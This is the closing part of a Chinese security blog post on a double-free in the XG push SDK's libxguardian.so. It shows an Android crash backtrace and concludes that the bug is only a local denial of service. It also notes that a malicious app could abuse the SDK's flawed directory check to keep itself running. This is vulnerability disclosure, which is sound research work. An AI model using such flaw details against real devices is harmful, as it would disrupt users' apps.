(  242):     d10 0000000000000000  d11 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  242):     d12 0000000000000000  d13 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  242):     d14 0000000000000000  d15 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  242):     d16 41c9ef5dd3bd0e56  d17 3f50624dd2f1a9fc</span><br><span class="line">I&#x2F;DEBUG   (  242):     d18 41ba01d435000000  d19 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  242):     d20 0000000000000000  d21 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  242):     d22 0000000000000000  d23 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  242):     d24 0000000000000000  d25 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  242):     d26 0000000000000000  d27 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  242):     d28 0000000000000000  d29 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  242):     d30 0000000000000000  d31 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  242):     scr 00000010</span><br><span class="line">I&#x2F;DEBUG   (  242):</span><br><span class="line">I&#x2F;DEBUG   (  242): backtrace:</span><br><span class="line">I&#x2F;DEBUG   (  242):     #00  pc 000116cc  &#x2F;system&#x2F;lib&#x2F;libc.so (dlfree+1191)</span><br><span class="line">I&#x2F;DEBUG   (  242):     #01  pc 0000dc0b  &#x2F;system&#x2F;lib&#x2F;libc.so (free+10)</span><br><span class="line">I&#x2F;DEBUG   (  242):     #02  pc 000026e7  &#x2F;data&#x2F;app-lib&#x2F;com.qufenqi.android.quwallet-2&#x2F;libxguardian.so</span><br><span class="line">I&#x2F;DEBUG   (  242):     #03  pc 00002ff7  &#x2F;data&#x2F;app-lib&#x2F;com.qufenqi.android.quwallet-2&#x2F;libxguardian.so</span><br><span class="line">I&#x2F;DEBUG   (  242):     #04  pc 000013b1  &#x2F;data&#x2F;app-lib&#x2F;com.qufenqi.android.quwallet-2&#x2F;libxguardian.so</span><br><span class="line">I&#x2F;DEBUG   (  242):     #05  pc 0000e34b  &#x2F;system&#x2F;lib&#x2F;libc.so (__libc_init+50)</span><br><span class="line">I&#x2F;DEBUG   (  242):     #06  pc 000014fc  &#x2F;data&#x2F;app-lib&#x2F;com.qufenqi.android.quwallet-2&#x2F;libxguardian.so&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure>

<p>当然，这个double free漏洞无法利用，因为堆中的内容只能为手机上安装的packagename，所以尽管克服重重困难破解了加密算法、安装了512个packagename，仍然只是一个local DoS。TSRC在最先评级认为是代码执行，后面也更正为了local DoS。</p>
<p>最后，总结下漏洞的成因，XG SDK以检查/data/data/&lt;packagename&gt;/lib的存在，来判断是否为使用XG sdk的app，这种方式不够严谨。依然有可能被恶意app利用来保活（ 因为XG sdk后续要启动app的服务），占用系统资源或者妨碍正常使用推送服务的app。</p>
</div><div class="tags"><a href="/tags/Android/"><i class="fa fa-tag"></i>Android</a></div><div class="post-nav"><a class="pre" href="/2016/12/08/ms509credit-from-google/">MS509团队获得Google致谢</a><a class="next" href="/2016/11/09/ms509-samsung/">MS509团队获三星官方致谢</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Android/" style="font-size: 15px;">Android</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/%E7%99%BB%E9%99%86%E5%87%AD%E8%AF%81/" style="font-size: 15px;">登陆凭证</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">原创漏洞</a> <a href="/tags/CMS/" style="font-size: 15px;">CMS</a> <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" style="font-size: 15px;">内网穿透</a> <a href="/tags/JAVA/" style="font-size: 15px;">JAVA</a> <a href="/tags/MySQL/" style="font-size: 15px;">MySQL</a> <a href="/tags/PWN/" style="font-size: 15px;">PWN</a> <a href="/tags/WAF%E7%BB%95%E8%BF%87/" style="font-size: 15px;">WAF绕过</a> <a href="/tags/Window/" style="font-size: 15px;">Window</a> <a href="/tags/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/" style="font-size: 15px;">杀毒软件</a> <a href="/tags/Cknife/" style="font-size: 15px;">Cknife</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/" style="font-size: 15px;">审计工具</a> <a href="/tags/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F/" style="font-size: 15px;">恶意程序</a> <a href="/tags/Github/" style="font-size: 15px;">Github</a> <a href="/tags/IOS/" style="font-size: 15px;">IOS</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/07/13/MysqlLogMonitor/">【工具开源】自研MysqlLogMonitor</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/29/Dsmall-Code-Audit/">DSMall的那些洞，你能发现吗？</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/24/Waf-Bypass-Sql/">WAF绕过奇技淫巧之SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/17/Collect-login-credentials/">linux后渗透之收集登录凭证</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/17/Intranet-penetration/">内网渗透之内网穿透</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/Subrion-Cms-Code-Audit/">Subrion CMS 代码审计</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/19/Java-Debug/">Java无源码调试之英雄崛起</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-smep-bypass/">CVE-2017-8890实现linux内核提权- SMEP绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-kernel-escalation1/">利用CVE-2017-8890实现linux内核提权- ret2usr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/03/bundle-mismatch/">Bundle风水——Android序列化与反序列化不匹配漏洞详解</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.zerokeeper.com/" title="小李飞刀" target="_blank">小李飞刀</a><ul></ul><a href="http://cybersec.blog.51cto.com" title="网络空间安全的道与术" target="_blank">网络空间安全的道与术</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>